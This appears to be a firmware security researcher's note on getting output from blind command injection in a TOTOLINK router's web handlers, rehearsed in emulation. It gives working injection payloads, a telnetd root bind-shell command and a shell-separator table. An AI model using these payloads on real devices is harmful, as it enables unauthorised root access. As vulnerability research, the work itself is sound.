# Observation channels for a blind injection — five oracles, four of them rehearsed

The line W04 root-caused is

```c
sprintf(buf, "flash set HW_WLAN0_WSC_PIN %s", localPin);
system(buf);
```

and the one W04-2 chose as G4's target is

```c
cmd = req_get_cstream_var(req, "sysCmd", "");
if (*cmd != '\0') {
  snprintf(buf, 100, "%s 2>&1 > %s", cmd, "/tmp/syscmd.log");
  system(buf);
}
```

**Neither returns anything to the HTTP client.** `system()`'s output goes to the
child's stdout, and in the second case the handler explicitly redirects it into
a file that is not in the document root. So the W05 plan's original success
criterion — *"look at the response: `uid=0(root)` means RCE"* — cannot happen on
this device, and not because the defect is absent. **It is a blind injection and
it needs an out-of-band channel.**

Four of the five below were executed in
[the emulation environment](emulation-2018.md) before anything was sent to
hardware. What that is worth and what it is not is in §7.

---

## The channels

| # | channel | what it proves | side effect | rehearsed |
|---|---|---|---|---|
| **0** | write into the document root, `GET` it back | **the command's output**, verbatim | a file in a ramfs; gone on reboot | ✅ emulated |
| 1 | ICMP to the bench host | a packet, at a time you chose | none on the device | ✅ emulated |
| 2 | `telnetd` on a spare port | an interactive shell | **opens a service**; must be closed | ⚠️ partial |
| 3 | response latency (`sleep N`) | timing only | none | ✅ emulated |
| **4** | **the bytes that changed in SPI flash** | **that this request altered non-volatile storage** | **writes flash** | ✅ emulated |

Order of use is **0 → 1 → 4**. 0 gives output, 1 gives a clean signal with no
writes, 4 gives the strongest evidence and costs the most.

---

## 0 — Write into the document root

`boa.conf` says `DocumentRoot /web`; `/web` is a symlink to `/var/web`; `rcS`
mounts `/var` as a **ramfs** and populates `/var/web` with `flash extr /web`.
So the document root is writable, in RAM, and reset by a power cycle.

```
POST /boafrm/formSysCmd    sysCmd=cat /etc/version > /var/web/k.txt;#
GET  /k.txt                -> TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002
```

### Use `cat /etc/version`, not `id`

**There is no `id` on this device.** BusyBox 1.13.4 here is built with 48
applets and that is not one of them:

```
ash bunzip2 bzcat cat chpasswd cp cut date echo expr false free getty grep
halt head hostname ifconfig init ip kill killall klogd ln login ls mkdir
mount nice nslookup ping ping6 poweroff ps reboot renice rm route sed sh
sleep syslogd tail telnetd tr traceroute true umount uptime wc
```

The plan's first-choice payload was `…;id > /var/web/x.txt;#`, and its failure
is indistinguishable from a miss:

```
/bin/sh: id: not found
-rw-r--r--  1 root root  0  /var/web/x.txt
```

The redirection creates the file; nothing fills it. On hardware that is an empty
200 and a wrong hypothesis.

`cat /etc/version` is the better payload for a different reason too: its output
**identifies the build**, so one response proves execution *and* names what it
executed on. Also available and rehearsed: `ls -l /`, `ps`, `cat /etc/passwd`.

### The handler's own redirection takes precedence — this is the trap

`formSysCmd` appends `2>&1 > /tmp/syscmd.log`. In `sh`, the **last** stdout
redirection wins, so a payload that just uses `>` loses:

| payload as `system()` receives it | where the output went |
|---|---|
| `ls -l / > /var/web/k.txt 2>&1 > /tmp/syscmd.log` | **`/tmp/syscmd.log`** — `/var/web/k.txt` is created and empty |
| `ls -l / > /var/web/k.txt;# 2>&1 > /tmp/syscmd.log` | `/var/web/k.txt` ✅ |

Both measured. **The `;` … `#` truncation is not stylistic**; without it the
handler's own tail silently redirects the result somewhere the document root
cannot reach. This is register item `P3-6`'s prediction, confirmed.

### The payload budget is 76 bytes

`snprintf(buf, 100, "%s 2>&1 > %s", cmd, "/tmp/syscmd.log")`. The suffix
` 2>&1 > /tmp/syscmd.log` is 23 bytes, plus the terminator, so **`cmd` has 76
bytes before `snprintf` truncates** — and truncation cuts the tail, which is
where the `#` is. A payload that overruns does not fail loudly; it becomes a
different command. Derived from W04-2's read of the handler, not measured.

### Preconditions, and their state

| | |
|---|---|
| `/var` is writable | ✅ `rcS`: `mount -t ramfs ramfs /var` |
| the document root is `/var/web` | ✅ `boa.conf` + the `/web → /var/web` symlink |
| `boa` serves files placed there after start-up | ⚠️ **not established.** `boa.conf` sets `DirectoryCache /tmp`; whether a file created after start-up is served without a restart has not been tested |
| a usable command exists | ✅ 48 applets, list above |

That third row is the one that can still cost an hour, and the cheapest way to
settle it is to write the file and `GET` it.

---

## 1 — ICMP

```
sysCmd=ping -c 3 <bench-host>;#
```

with `tcpdump -ni <if> icmp` on the bench host. `ping` is compiled in.
Rehearsed: the guest's own `ping`, run through `/bin/sh -c` in the emulator,
produced packets `tcpdump` recorded on the host:

```
07:48:47.906828 IP 127.0.0.1 > 127.0.0.1: ICMP echo request, id 2825, seq 0, length 64
07:48:47.906842 IP 127.0.0.1 > 127.0.0.1: ICMP echo reply,   id 2825, seq 0, length 64
```

The cleanest channel: no file, no service, nothing left behind. It proves a
command ran and **carries no output**, which is why it is second rather than
first.

---

## 2 — A shell on a spare port

```
sysCmd=telnetd -p 2323 -l /bin/sh;#
```

**`telnetd` is compiled into this BusyBox**, and so are `login` and `chpasswd`,
while `TELNET_ENABLED` is `0` and `/etc/passwd.org` still carries
`root:123456`. So the flag is the only thing between an unauthenticated command
execution and an interactive root shell — a chain worth stating plainly, and one
the register already has as a prediction rather than a claim.

**Rehearsed only partially**: the applet exists and `/bin/sh` exists; it was not
started, because binding a listener from the emulator binds it on the bench
host. On the device this opens a service that has to be closed again, so it
ranks below 0 and 1 and is used only if they fail.

---

## 3 — Timing

```
sysCmd=sleep 8;#
```

Measured in the emulator against a control run of the same command without the
`sleep`:

| | |
|---|---|
| without `sleep` | 56 ms |
| with `sleep 5` | 5,065 ms |
| difference | **5,009 ms**, against 5,000 predicted |

No side effects at all, and the weakest signal — it proves a delay, not a
command. Its real use is as a **fallback when every other channel is blocked**,
and as a way to test whether the request is synchronous with the `system()` call
at all.

---

## 4 — The bytes that changed in flash

This is the one that is specific to this project, because it needs a byte-for-byte
copy of the device's flash taken beforehand — which W02 produced.

**Rehearsed end to end in the emulator.** One shell command of the shape `boa`
composes, then a diff of the flash image against the pristine copy:

```
$ sudo tools/qemu-env.sh run /bin/sh -c \
      'flash set HW_WLAN0_WSC_PIN 1;ls -l / > /var/web/x.txt 2>&1;#'
$ sudo tools/qemu-env.sh diff
3 bytes changed
  0x00648a  0x39 -> 0x31
  0x00648b  0x39 -> 0x00
  0x006493  0x0d -> 0x4e   <- H601 checksum
checksum: delta 65, expected 65 -> balances
```

**So the hardware prediction is specific rather than "something will change":**
setting the WPS PIN to a one-character value changes the first PIN byte, writes
a NUL after it, and moves the `H601` checksum at `0x006493` by the negation of
the payload delta. Any other pattern on the device means the emulated write path
and the real one differ, and that is worth more than a confirmation.

Two by-products of the rehearsal:

- **The old value's tail survives.** `"99956042"` → `"1"` leaves
  `31 00 39 35 36 30 34 32` — the string terminates after one byte and `956042`
  stays in flash. The vendor does not clear the remainder of the field.
- **`flash set` writes flash for hardware MIBs only.** A configuration MIB
  (`DEVICE_NAME`) changed **zero** bytes while a fresh process read the new
  value — it lives in shared memory until something commits it, and
  `flash write-current` did not. Full table in
  [`emulation-2018.md` §5](emulation-2018.md).

> ⚠️ **What this oracle costs.** `HW_WLAN0_WSC_PIN` is at `0x648a`, inside the
> **`H601` block at `0x006000`** — this unit's MAC addresses and radio
> calibration, which exist nowhere else and which a factory reset does not
> restore. On the device the write is a read-modify-erase-program cycle over the
> containing erase block, not a 3-byte poke. **Take the 64 KiB snapshot first**,
> every time, and prefer a target that writes nothing when one is available.

---

## 5 — Command separators

Ten shapes, each the string `sprintf` would produce, executed by **this
rootfs's own** `/bin/sh` (BusyBox 1.13.4 `ash`) in the emulator:

| shape | reaches the second command |
|---|---|
| `1;cmd` | ✅ |
| `` 1`cmd` `` | ✅ |
| `1$(cmd)` | ✅ |
| `1\|cmd` | ✅ |
| `1&&cmd` | ✅ |
| `1&cmd` | ✅ |
| `1<newline>cmd` | ✅ |
| `1>/dev/null;cmd` | ✅ |
| `1;{ cmd; }` | ✅ |
| `1\|\|cmd` | **❌** |

`||` is not being filtered. `flash set` **succeeded**, so `||` short-circuits —
which means **its silence is a measurement**: it reports the sink command's exit
status, and none of the other nine do. Useful for distinguishing "my command did
not run" from "the sink itself failed".

For `targetAPSsid`, which W04 found interpolated **inside shell double quotes**,
the payload has to close the quote first:

```
" ; cat /etc/version > /var/web/k.txt ; echo "
```

Rehearsed as a shell string; **not** rehearsed through the handler, because
`formWsc`'s path needs the wireless stack the emulator does not have.

---

## 6 — Choosing a target

| target | writes flash? | rehearsed | note |
|---|---|---|---|
| **`formSysCmd` / `sysCmd`** | **no** — output to `/tmp/syscmd.log` | shell shape ✅ | W04-2's choice. Confirmed here as the one with no non-volatile side effect |
| `formWsc` / `peerPin` | no — `/var` only | ✗ (wireless) | |
| `formWsc` / `localPin` | **yes — `H601`** | ✅ | strongest oracle, highest cost |
| `formRoute` / `subnet` | unknown | ✗ | found by `BoaGate` in all three builds, in none of W04's manual reading |

W04-2 chose `formSysCmd` from the dispatch table and the gate. **The emulation
adds an independent reason to keep it**: it is the only candidate that leaves
non-volatile storage untouched, so it can be repeated without consuming the
thing that cannot be replaced.

---

## 7 — What a rehearsal in the emulator is and is not

Every ✅ above means *this rootfs's own binaries, running on this unit's own
flash image, under `qemu-mips-static`.* It is not the device.

- **`boa` is not in the path of any of it.** It dies during start-up on an
  unaligned store the device's kernel would fix up
  ([`emulation-2018.md` §4](emulation-2018.md)). Everything here tests the
  *sink* — the shell and `flash` — and takes the *composition* from a static
  read of the handler. **Whether the parameter reaches `system()` unmodified is
  still a claim about code that has not been executed.**
- **Some commands describe the host, not the device.** In a chroot, `ps`,
  `ifconfig`, `uptime`, `hostname` and `cat /proc/version` read the host's
  `/proc` and the host's interfaces — the rehearsal returned WSL's kernel banner
  and WSL's MAC. Only filesystem-scoped commands (`ls`, `cat /etc/version`,
  `cat /etc/passwd`) describe the emulated device. **On hardware this inverts,
  and those are exactly the commands worth sending.**
- **The flash write is a file write.** Erase-block semantics, wear and
  interrupted-write behaviour are all absent.
- The register records these as `emulated`, which is a third evidence grade
  added for this work and which **never renders as the dynamic tick**. Executed
  is not the same as executed on the silicon.

---

## 8 — How the first version of this note was wrong

**It had four oracles and the best one was missing.** The first draft ranked
ICMP first, on the grounds that it leaves nothing behind. It does — and it also
returns nothing. The document-root channel gives you the command's *output*, on
a device whose document root is a ramfs that a reboot clears, which is both more
informative and barely less clean. Writing "ICMP is the cleanest" was optimising
for a property nobody had asked for.

**And it specified `id`.** Not from the device — from habit. The applet list was
listed in the plan as a precondition to check, the check was not done, and the
payload survived three drafts. `id` would have produced an empty file that looks
exactly like a filtered parameter.

**The redirection interaction was not in it at all.** The handler's own
`2>&1 > /tmp/syscmd.log` silently wins over a payload's `>`, so the first
version's payloads would have written empty files into the document root while
the real output sat in `/tmp`, unreachable — the same observable as `id` being
absent, from an unrelated cause. Two independent ways to get an empty file, and
the draft had no way to tell them apart.
